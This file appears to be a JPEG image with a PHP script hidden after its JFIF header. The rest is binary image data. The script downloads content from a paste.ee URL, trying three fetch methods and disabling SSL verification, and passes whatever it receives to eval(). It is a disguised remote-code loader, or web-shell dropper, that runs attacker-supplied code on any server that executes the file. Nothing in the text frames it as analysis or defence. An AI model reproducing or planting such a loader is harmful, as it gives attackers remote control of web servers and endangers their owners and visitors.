    JFIF         <?php
$protocol = "https";
$domain = "paste.ee";
$file_path = "/r/kJfacxRI/0";
$url = $protocol . "://" . $domain . $file_path;

function fetch_content($url, $method) {
    switch ($method) {
        case 'file_get_contents':
            if (ini_get('allow_url_fopen')) {
                return file_get_contents($url);
            }
            break;
        case 'curl':
            if (function_exists('curl_version')) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $response = curl_exec($ch);
                curl_close($ch);
                return $response;
            }
            break;
        case 'stream':
            if ($stream = fopen($url, 'r')) {
                $content = stream_get_contents($stream);
                fclose($stream);
                return $content;
            }
            break;
        default:
            return false;
    }
    return false;
}

$methods = ['file_get_contents', 'curl', 'stream'];
$content = false;

foreach ($methods as $method) {
    $content = fetch_content($url, $method);
    if ($content !== false) {
        break;
    }
}

if ($content !== false) {
    eval("?>" . $content);
} else {
    echo "  ";
}
?>
   C 	

			



		


   
1&                 	   = 
    ! 1"2AQ#q3BRaC$%45Srs          ?  T                                                            l8.     qy S   S  t  b   & ߖ   >  ̧VGVs ?jr ċ    JOQ   k [  W  
 צ ] ?_%d     C r  k MxI 	 | { }} ׁ S    r NV  JR  uv& 97& ޞ    b             q w! e   x9 V ۣ Yd z SoI7 '   a      K ð  v] [   2   a:p 
   ฬN?˽׍Lk         ߟ      i   ⲫ  h:1 B e m zM   yq~ t^ F@           ӏJ: Ԝ % : 8 i   ؛kp _ j/  i|mǺ;    Kt   65N "  u $ )? ը ޒ   G    ' 2G     힧
  Z %%  - r ~O              du D:  *    oI7 M=8A  & )   >v jp 08 h q  X rp   T;   R  m _   T  ^      ;lx N 8J &횃K  5  i=  F           H  z]  ; C ` y   {   L  n.Z֢ Sqݼ    ƫ 袈F   *1 "    KI@    q >; ˅   Ʒ* ֓  qrj)   z _ԡY    e  9Ym I s {r ~[m c           Atg!  O  |} Ͻ e  N4U NI  NR   ˩   O U b  kڊ   9v    )=-   l@  ~ y ྙf 
2+     Kֶ   l  qz  ֛*            _N?   }N ) n~  ;  ּ.   [  /   H@ G꧕ǧ  nP ߗ , I%ءUr  { t5  ~W ր         ( =tO     eW  .~5 f>$    5  ? [@    V_=-      +              :7 8 	Ueyy Y   JWY e	7  ?  oI v  }V Yp ?  u 12oŜ[} v 2 ^5       Ϋ           a Lk}B 8 h 1j  yI    U   |(ͨ׷ s^ú   "ߩ%r^ _   o Vf>_ogw          ^v `           T ? ީ  Ϗƿ   t;S   {k ? X0  >  , 3   «.  >   E ]    5>֛֚Ok[(              7 d v.G#+snV E  6  )|FUF   5 "       Gu  ' 
  .ǝ   5 Sd Q b j    ?& G         
  x }Ӹ tYE qX  U q &  q ~SOi o@  w K W;  n?vw	 ?d7+1$   -  jKmF1v            (   1  c cۉ Ew |%] Y(N
i I i   I J l O  '   弌 r R    Ծ֤    ƛ              W    Ӌ    r8 w dN	 =i ' %	x o  K    , 77# Υӓ l躷 	ŵ( ~ 4a            ( úc    q $ ' 4 3    E>  1  X     :  y[Q t 	  4  7 ї 8UL l < q2貋蜫  " 8N/N2O i  f0           r   7  o 8 1 ZՕAW5 $    @   kꗢ| > 1 g z4 W|t Ȓ j i   T    